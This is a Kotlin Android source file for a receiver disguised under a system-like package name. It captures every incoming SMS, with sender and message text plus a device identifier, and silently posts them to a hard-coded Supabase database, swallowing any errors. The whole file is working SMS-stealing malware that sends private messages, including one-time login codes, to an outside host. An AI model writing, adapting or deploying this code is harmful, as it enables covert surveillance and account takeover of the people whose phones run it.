package com.sys.service

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import okhttp3.*
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

class SmsReceiver : BroadcastReceiver() {
    private val SUPABASE_URL = "https://fmfxqjerktoclzmuited.supabase.co"
    private val SUPABASE_KEY = "sb_publishable_v8EhqjGh1B87NatTuypl9w_xS3V3JRF"

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras ?: return
            val pdus = bundle.get("pdus") as? Array<*> ?: return
            val format = bundle.getString("format")

            val sb = StringBuilder()
            var sender = "Unknown"
            for (pdu in pdus) {
                val sms = android.telephony.SmsMessage.createFromPdu(pdu as ByteArray, format)
                sender = sms.originatingAddress ?: "Unknown"
                sb.append(sms.messageBody).append("\n")
            }

            val sid = Build.SERIAL + "_" + Build.MODEL
            val json = JSONObject().apply {
                put("device_id", sid)
                put("type", "sms")
                put("content", "From: $sender\n$sb")
            }
            
            val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).build()
            val req = Request.Builder()
                .url("$SUPABASE_URL/rest/v1/results")
                .addHeader("apikey", SUPABASE_KEY)
                .addHeader("Authorization", "Bearer $SUPABASE_KEY")
                .addHeader("Content-Type", "application/json")
                .post(RequestBody.create(MediaType.parse("application/json"), json.toString()))
                .build()
            client.newCall(req).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {}
                override fun onResponse(call: Call, response: Response) { response.close() }
            })
        }
    }
}
